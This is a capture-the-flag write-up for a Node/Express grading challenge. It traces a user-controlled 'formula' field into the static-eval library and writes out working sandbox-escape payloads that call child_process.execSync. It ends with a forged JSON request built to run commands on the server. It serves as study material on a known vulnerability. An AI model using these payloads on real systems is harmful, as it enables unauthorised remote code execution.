# Intro

The website seems like as simple as choose between two names and press the button "did i pass" and the output seems the same for both "NOOOPE".

# Whatweb

```
http://134.122.104.208:30996/ [200 OK] Country[UNITED STATES][US], HTML5, IP[134.122.104.208], Meta-Author[makelaris, makelarisjr], Script[text/javascript], Title[inside starship enterprise], X-Powered-By[Express]
```

# Analysing the source code

## main.js

Looking at the main.js source code all that matters for us is the last listener

```
document.getElementById('form').addEventListener('submit', e => {
	e.preventDefault();

	fetch('/api/calculate', {
		method: 'POST',
		body: JSON.stringify({
			name: document.querySelector('input[type=radio]:checked').value
		}),
		headers: {'Content-Type': 'application/json'}
	}).then(resp => {
		return resp.json();
	}).then(data => {
		document.getElementById('output').innerHTML = data.pass;
	});

});
```
It takes the form value and send a POST request to the /api/calculate endpoint in the json format.

## routes/index.js

In this file is specified all the endpoints and how to deal with them.
The router that it matters for this challenges is the /api/calculate.

```
router.post('/api/calculate', (req, res) => {
    let student = req.body;

    if (student.name === undefined) {
        return res.send({
            error: 'Specify student name'
        })
    }

    let formula = student.formula || '[0.20 * assignment + 0.25 * exam + 0.25 * paper]';

    if (StudentHelper.isDumb(student.name) || !StudentHelper.hasPassed(student, formula)) {
        return res.send({
            'pass': 'n' + randomize('?', 10, {chars: 'o0'}) + 'pe'
        });
    }

    return res.send({
        'pass': 'Passed'
    });
});
```

Basically what it does is:

- Check if the name is null
- Then if the parameter formula is not passed it will assign the second value to the formula variable.
- Then it will check with the fucntions from StudentHelper.js if we pass or not.

At this point we notice that we can control the value of name and a new one called formula.
This may be bad because in theory it lets the student specify which formula he wants.

Since the if statement is a OR we need to have FALSE in both to avoid enter in the IF.
Lets analyze the StudentHelper.js to see how we can bypass the functions there.

## helpers/StudentHelper.js

```
const evaluate = require('static-eval');
const parse = require('esprima').parse;

module.exports = {
    isDumb(name){
        return (name.includes('Baker') || name.includes('Purvis'));
    },

    hasPassed({ exam, paper, assignment }, formula) {
        let ast = parse(formula).body[0].expression;
        let weight = evaluate(ast, { exam, paper, assignment });

        return parseFloat(weight) >= parseFloat(10.5);
    }
};

```

After some time analysing this function I notice one thing I was focus on the wrong goal, my goal is to get the flag and not pass the grade.

Note: WE can pass the grade by applying one of the following payloads:

```
{
  "name":"none",
  "exam":5,
  "paper":5,
  "assignment":1,
  "formula":"[assignment + exam + paper]"
}
```

```
{"name":"none","exam":200,"paper":200,"assignment":200}
```

## Vulnerability

Searching for ways to read the flag I found this link https://github.com/advisories/GHSA-8v27-2fg9-7h62.
It seems like the static-eval has a Arbitrary COde execution vulnerability.


```

All versions of package static-eval are vulnerable to Arbitrary Code Execution using FunctionExpressions and TemplateLiterals. PoC: var evaluate = require('static-eval'); var parse = require('esprima').parse; var src="(function (x) { return ${eval("console.log(global.process.mainModule.constructor._load('child_process').execSync('ls').toString())")} })()" var ast = parse(src).body[0].expression; evaluate(ast)

```

Looking at the payload and applying to our case we need to pass the variable formula with the payload and read the flag.
Since we cant return the contents in the response we have two options:

- Send the flag to our server
- Create a file in the challenge server in the static directory and read the contents.

## Test environment

We will use the second option first and then explore the first one.
To ensure that we can exploit this vulnerability we will create a simple application with the vulnerability in our envirnoment.

- mkdir esprima-test && cd esprima-test
- npm init
- npm install --save esprima@
- npm install --save static-eval@2.0.
- create a index.js

```
const parse = require('esprima').parse
const evaluate = require('static-eval')

const program = '3*4'
const ast = parse(program).body[0].expression
let result = evaluate(ast)
console.log(result)
```

## Finding the right vulnerability

Since the version for static-eval is 2.0.2 we can go to the github repo and look for fixes in later versions.
This means that in previous versions like 2.0.2 we have vulnerabilites
Lets look at the 2.0.3 in https://github.com/browserify/static-eval/tags
Looking at the realese description we see:

```
Disallows accessing .constructor and .__proto__ properties, which could be used to access the Function() constructor. (#27)
Thanks to an anonymous reporter!
```

And if we Open the merge request we have a test file:

https://github.com/browserify/static-eval/pull/27/commits/b0c80ab8d8cb6fc9b48f3605f6f240f7e94fc670#diff-cc0f920a07c6f12cbd048f51fc7e0c807eef485f03db389f93f912d73829828b

In this step i got stucked an started to read an exploit created by another user:

https://braincoke.fr/write-up/hack-the-box/baby-breaking-grad/

```

// Prototype pollution of variable polluted
// when accessing the variable value we call its getter
const program =  "`${({})['__proto__']['__defineGetter__']('polluted', function(){ return `${console.log(process.env)}`; })}`"


// We just need to trigger the getter function
// which displays the value of process.env
polluted

```

I tried creating a payload like the following:

```
const program =  "`${({})['__proto__']['__defineGetter__']('polluted', function(){ return `${console.log(process.mainModule.constructor._load('child_process').execSync('ls').toString())}`; })}`"
```

Result: Maximum call stack size exceeded

Well it seems I'm stuck again lets look at all the commits from 2.0.2 to 2.0.3.
https://github.com/browserify/static-eval/commits/v2.0.3

The second commit seems interesting...

https://github.com/browserify/static-eval/commit/0bcd9dc93f42898dfd832a10915a4544e11b8f13

Using the second test payloads in the /test/eval.js

We create the following payload 

```
const program = '(function myTag(y){return ""[!y?"__proto__":"constructor"][y]})("constructor")("console.log(process.mainModule.constructor._load(\'child_process\').execSync(\'ls\').toString())")()'
```
Using it in our test envirnoment we are able to execute the command no problem. Lets FORGE THE REQUEST


{"name":"none","formula":"(function myTag(y){return ""[!y?"__proto__":"constructor"][y]})("constructor")("console.log(process.mainModule.constructor._load(\'child_process\').execSync(\'ls\').toString())")()"
}